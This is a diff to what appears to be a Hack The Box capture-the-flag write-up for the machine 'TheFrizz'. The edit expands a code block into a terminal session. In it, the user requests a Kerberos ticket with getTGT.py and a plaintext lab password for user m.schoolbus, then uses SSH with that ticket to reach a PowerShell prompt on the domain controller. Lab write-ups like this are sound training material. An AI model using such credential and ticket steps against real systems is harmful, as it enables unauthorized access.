@@ -324,8 +324,15 @@ So, among the above users, `m.schoolbus` is a member of Group Policy Creator so 
 
 Now we can login to this user via `ssh` after getting the Kerberos ticket.
 ```
-getTGT.py frizz.htb/m.schoolbus:'!suBcig@MehTed!R'
+┌─[htb_lab_truelyyours]─[10.10.16.82]─[truelyyours@parrot]─[~/htb/machines/thefrizz]
+└──╼ [★]$ getTGT.py frizz.htb/m.schoolbus:'!suBcig@MehTed!R'
+┌─[htb_lab_truelyyours]─[10.10.16.82]─[truelyyours@parrot]─[~/htb/machines/thefrizz]
+└──╼ [★]$ KRB5CCNAME=m.schoolbus.ccache ssh -K m.schoolbus@frizzdc.frizz.htb
+PowerShell 7.4.5
+PS C:\Users\M.SchoolBus>
+
 ```
+
 
 
 
